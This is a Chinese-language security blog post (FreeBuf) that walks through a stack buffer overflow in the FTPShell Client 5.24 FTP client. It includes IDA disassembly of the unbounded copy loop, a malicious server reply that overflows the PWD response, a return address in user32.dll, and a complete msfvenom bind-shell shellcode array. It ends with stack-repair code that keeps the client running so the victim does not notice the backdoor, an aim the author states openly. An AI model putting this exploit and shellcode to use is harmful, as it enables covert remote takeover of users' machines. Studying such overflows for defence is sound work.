***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 起因

**这是一个简单的缓冲区溢出的漏洞，今天没事，来分析一下看看他溢出的原因，最后通过平衡堆栈的方式，让目标程序执行shellcode使程序不crash。只是用来研究和学习。**

## 测试软件名称及版本  

FTPShell Client 5.24  

下载地址：<https://pan.baidu.com/s/1IHOfx0IQQOpuTs55f-T-aQ>  

密码：qvo4  

## 用到的工具  

\- IDA 6.8

\- winxp sp3 32位虚拟机

## 测试漏洞  

> 1、起一个ftp服务器，打开21端口。
>
> 2、等待客户端连接后，向客户方发送PWD的数据
>
> 3、ftp客户端收到服务器发送的PWD数据后，会crash

### 服务器给客户端发送的数据：  

    
    
    buffer = "A" * 400 + target_eip + "\x90" * 40 + shellcode
    sks.send('257 "' + buffer + '" is current directory\r\n')  
    

### 远程注入代码前后的流程图对比：  

![1309289.jpg](https://image.3001.net/images/20180612/15288142941110.jpg!small)

### 分析漏洞的位置：  

这个call的主要功能键就是读取服务器发送来的数据到buffer  

    
    
    .text:0044D010 8D 95 6C FE FF FF                       lea     edx, [ebp+var_194]
    .text:0044D016 52                                      push    edx
    .text:0044D017 56                                      push    esi
    .text:0044D018 53                                      push    ebx
    .text:0044D019 E8 E6 12 00 00                          call    read_server_string_to_buffer ;读取服务器发来的buffer
    .text:0044D019                                                                 ; success    = 0 ;
    .text:0044D019                                                                 ; fail    = 1; no_server_data
    .text:0044D01E 83 C4 0C                                add     esp, 0Ch
    .text:0044D021 85 C0                                   test    eax, eax
    .text:0044D023 75 34                                   jnz     short loc_44D059  
    

### 程序分配栈的大小  

进入read_server_string_to_buffer这个call，我们看看分配栈的大小为0x408  

    
    
    .text:0044E304 55                                      push    ebp
    .text:0044E305 8B EC                                   mov     ebp, esp
    .text:0044E307 81 C4 F8 FB FF FF                       add     esp, -408h      ; 分配local栈的大小
    .text:0044E30D 53                                      push    ebx
    .text:0044E30E 56                                      push    esi
    .text:0044E30F 57                                      push    edi
    .text:0044E310 8D 75 FC                                lea     esi, [ebp+var_4]
    .text:0044E313 8B 45 0C                                mov     eax, [ebp+arg_4]
    .text:0044E316 8B 7D 08                                mov     edi, [ebp+arg_0]
    .text:0044E319 8B 98 9C 05 00 00                       mov     ebx, [eax+59Ch] ; 收到server发来的buffer指针
    .text:0044E31F 85 DB                                   test    ebx, ebx
    .text:0044E321 0F 84 3B 01 00 00                       jz      no_server_data  
    

### 溢出的位置  

没有做长度限制，这个地方只要大于0x408个字符，就会把堆栈覆盖  

    
    
    while( v != 0 )
    {
       save buffer;__over_flow
    }  
    
    
    
    .text:0044E404    
    .text:0044E404                         loop_while_buffer:                      ; CODE XREF: read_server_string_to_buffer+124↓j
    .text:0044E404 85 D2                                   test    edx, edx        ; 没有做长度限制，这个地方只要大于408个字符，就会把堆栈覆盖
    .text:0044E404                                                                 ; while(    v != 0 )
    .text:0044E404                                                                 ; {
    .text:0044E404                                                                 ;         save buffer;__over_flow
    .text:0044E404                                                                 ; }
    .text:0044E406 74 03                                   jz      short loc_44E40B
    .text:0044E408 88 0E                                   mov     [esi], cl
    .text:0044E40A 46                                      inc     esi
    .text:0044E40B
    .text:0044E40B                         loc_44E40B:                             ; CODE XREF: read_server_string_to_buffer+102↑j
    .text:0044E40B 0F BE 08                                movsx   ecx, byte ptr [eax]
    .text:0044E40E 83 F9 22                                cmp     ecx, 22h
    .text:0044E411 75 10                                   jnz     short loc_44E423
    .text:0044E413 83 FA 01                                cmp     edx, 1
    .text:0044E416 75 06                                   jnz     short loc_44E41E
    .text:0044E418 4E                                      dec     esi
    .text:0044E419 C6 06 00                                mov     byte ptr [esi], 0
    .text:0044E41C EB 0C                                   jmp     short break_jump; 数据读取完毕
    .text:0044E41E                         ; ---------------------------------------------------------------------------    .text:0044E41E
    .text:0044E41E                         loc_44E41E:                             ; CODE XREF: read_server_string_to_buffer+112↑j
    .text:0044E41E BA 01 00 00 00                          mov     edx, 1
    .text:0044E423
    .text:0044E423                         loc_44E423:                             ; CODE XREF: read_server_string_to_buffer+10D↑j
    .text:0044E423 40                                      inc     eax
    .text:0044E424
    .text:0044E424                         loc_44E424:                             ; CODE XREF: read_server_string_to_buffer+FE↑j
    .text:0044E424 8A 08                                   mov     cl, [eax]
    .text:0044E426 84 C9                                   test    cl, cl
    .text:0044E428 75 DA                                   jnz     short loop_while_buffer ; 没有做长度限制，这个地方只要大于400个字符，就会把堆栈覆盖  
    

### 读取成功和失败的返回值  

eax = 0,读取成功

eax = 1,读取失败

这里我们需要保持读取成功的状态才可以

    
    
    .text:0044E441                         loc_44E441:                             ; CODE XREF: read_server_string_to_buffer+131↑j
    .text:0044E441 33 C0                                   xor     eax, eax        ===>成功标志
    .text:0044E443 EB 22                                   jmp     short ret_pre
    .text:0044E445                         ; ---------------------------------------------------------------------------    .text:0044E445
    .text:0044E445                         is_not_number:                          ; CODE XREF: read_server_string_to_buffer+50↑j
    .text:0044E445                                                                 ; read_server_string_to_buffer+63↑j    ...
    .text:0044E445 53                                      push    ebx
    .text:0044E446 8B 55 0C                                mov     edx, [ebp+arg_4]
    .text:0044E449 81 C2 98 05 00 00                       add     edx, 598h
    .text:0044E44F 52                                      push    edx
    .text:0044E450 E8 7B FE FF FF                          call    sub_44E2D0
    .text:0044E455 83 C4 08                                add     esp, 8
    .text:0044E458 8B D8                                   mov     ebx, eax
    .text:0044E45A 85 DB                                   test    ebx, ebx
    .text:0044E45C 0F 85 C5 FE FF FF                       jnz     loc_44E327
    .text:0044E462
    .text:0044E462                         no_server_data:                         ; CODE XREF: read_server_string_to_buffer+1D↑j
    .text:0044E462 B8 01 00 00 00                          mov     eax, 1        ===>失败标志
    .text:0044E467
    .text:0044E467                         ret_pre:                                ; CODE XREF: read_server_string_to_buffer+13B↑j
    .text:0044E467                                                                 ; read_server_string_to_buffer+13F↑j
    .text:0044E467 5F                                      pop     edi
    .text:0044E468 5E                                      pop     esi
    .text:0044E469 5B                                      pop     ebx
    .text:0044E46A 8B E5                                   mov     esp, ebp
    .text:0044E46C 5D                                      pop     ebp
    .text:0044E46D C3                                      retn  
    

### crash点

    
    
    .text:0044D077 33 C0                                   xor     eax, eax
    .text:0044D079 89 83 38 2B 00 00                       mov     [ebx+2B38h], eax
    .text:0044D07F 8B 55 F4                                mov     edx, [ebp+var_C]
    .text:0044D082 52                                      push    edx
    .text:0044D083 8B 4D F8                                mov     ecx, [ebp+var_8]
    .text:0044D086 51                                      push    ecx
    .text:0044D087 53                                      push    ebx
    .text:0044D088
     FF 55 FC                                call    [ebp+var_4]     ; 
    因为堆栈的数据被覆盖程序crash，位置应该是0x408,我们可以把这里指向我们的shellcode的代码段
    .text:0044D08B 83 C4 0C                                add     esp, 0Ch          
    

### target_eip

我在这里用的是user32.dll,地址为：0x77d4e56b 你可以根据自己的系统自己选择kernel32.dll或者其他

### 加入shellcode

> 由于这是在没有开启dep保护的情况下进行的测试攻击，所以自己写的代码是可以直接在堆栈运行的。
>
> 如果在dep保护模式下进行攻击的话，shellcode的代码就需要通过rop链来进行维护，然后运行。
>
> 这里我使用msfvenom -p windows/shell_bind_tcp LPORT=8848 -f c 生成shellcode,等待连接端口
    
    
    shellcode = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
    "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
    "\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
    "\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x22\x90\x89"
    "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
    "\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97"
    "\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57"
    "\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c"
    "\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
    "\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0"
    "\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5"
    "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb"
    "\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")  
    

运行server，然后用ftp连接，是客户端程序crash了。

### 连接目标机器

\- 然后使用nmap 扫描目标机器，发现目标机器8848端口已经打开，

\- 用nc连接进入了一个consle窗口

## crash

做事要有始有终，虽然程序crash了，但是我们不需要让程序crash,要不然就被用户知道了，就会更新版本，或者重装软件，所以我们的宗旨是让用户快乐的用这带后门的程序。  

### 分析crash的原因

因为栈的数据被覆盖程序crash

    
    
    .text:0044D56B 83 C4 0C                                add     esp, 0Ch
    .text:0044D56E
    .text:0044D56E                         loc_44D56E:                             ; CODE XREF: sub_44D19C+11↑j
    .text:0044D56E                                                                 ; sub_44D19C+4A↑j    ...
    .text:0044D56E 5F                                      pop     edi
    .text:0044D56F 5E                                      pop     esi
    .text:0044D570 5B                                      pop     ebx
    .text:0044D571 8B E5                                   mov     esp, ebp
    .text:0044D573 5D                                      pop     ebp
    .text:0044D574 C3                                      retn             ====》返回到上一层的时候，栈地址被覆盖了
    .text:0044D574                         sub_44D19C      endp  
    

### 修复堆栈，防止程序crash

由于返回地址被覆盖，所以我们需要修复堆栈，让程序可以找到自己的返回位置，那么程序就不会crash了，在shellcode代码运行完成后，我们加入以下平衡堆栈的代码，就不会crash了

    
    
    .text:00000000 BC A4 F8 12 00                          mov     esp, 12FBA4h
    .text:00000000 C3                                      retn  
    

再次测试，运行完自己的shellcode，后门已经开了，程序依然还在运行，收工 ：）

 ***本文作者：yearnwang，转载请注明来自FreeBuf.COM**

